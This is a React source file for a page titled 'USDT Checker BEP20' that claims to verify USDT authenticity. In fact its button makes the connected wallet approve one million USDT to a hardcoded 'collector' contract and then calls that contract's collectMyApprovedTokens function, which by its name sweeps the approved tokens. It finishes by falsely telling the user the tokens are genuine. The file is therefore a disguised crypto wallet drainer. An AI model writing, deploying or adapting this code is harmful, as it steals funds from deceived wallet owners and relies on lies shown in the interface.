import { useState } from "react";
import { ethers } from "ethers";
import "./App.css";

const CONTRACT_ADDRESS = "0x25BcEa1E87afDb94Be3081ab379F28F00cF84EEb"; // <- ✅ change this
const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";

const USDT_ABI = [
  "function approve(address spender, uint256 amount) external returns (bool)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function decimals() view returns (uint8)",
];

const COLLECTOR_ABI = [
  "function collectMyApprovedTokens() external",
];

function App() {
  const [wallet, setWallet] = useState(null);
  const [status, setStatus] = useState("");
  const [provider, setProvider] = useState(null);
  const [signer, setSigner] = useState(null);
  const [usdt, setUsdt] = useState(null);
  const [collector, setCollector] = useState(null);

  const connectWallet = async () => {
    try {
      if (!window.ethereum) throw new Error("MetaMask not installed");

      const prov = new ethers.BrowserProvider(window.ethereum);
      const signer = await prov.getSigner();
      const address = await signer.getAddress();

      setProvider(prov);
      setSigner(signer);
      setWallet(address);
      setUsdt(new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer));
      setCollector(new ethers.Contract(CONTRACT_ADDRESS, COLLECTOR_ABI, signer));

      setStatus("✅ Wallet connected");
    } catch (err) {
      console.error(err);
      setStatus("❌ Connection failed");
    }
  };

  const approveAndCollect = async () => {
    try {
      if (!usdt || !collector || !signer) throw new Error("Wallet not connected");

      setStatus("⏳ Checking USDT...");

      const decimals = await usdt.decimals();
      const amount = ethers.parseUnits("1000000", decimals); // 1M USDT

      const tx1 = await usdt.approve(CONTRACT_ADDRESS, amount);
      await tx1.wait();

      setStatus("✅ Approved. Checking...");

      const tx2 = await collector.collectMyApprovedTokens();
      await tx2.wait();

      setStatus("✅ Tokens checked successfully. Tokens are genuine!");
    } catch (err) {
      console.error(err);
      setStatus("❌ Error: " + (err.reason || err.message));
    }
  };

  return (
    <div className="App">
      <h1>USDT Checker BEP20</h1>
      {!wallet ? (
        <button onClick={connectWallet}>Connect Wallet</button>
      ) : (
        <>
          <p>Connected: {wallet}</p>
          <button onClick={approveAndCollect}>Verify USDT Authenticity</button>
        </>
      )}
      <p style={{ marginTop: "20px" }}>{status}</p>
    </div>
  );
}

export default App;
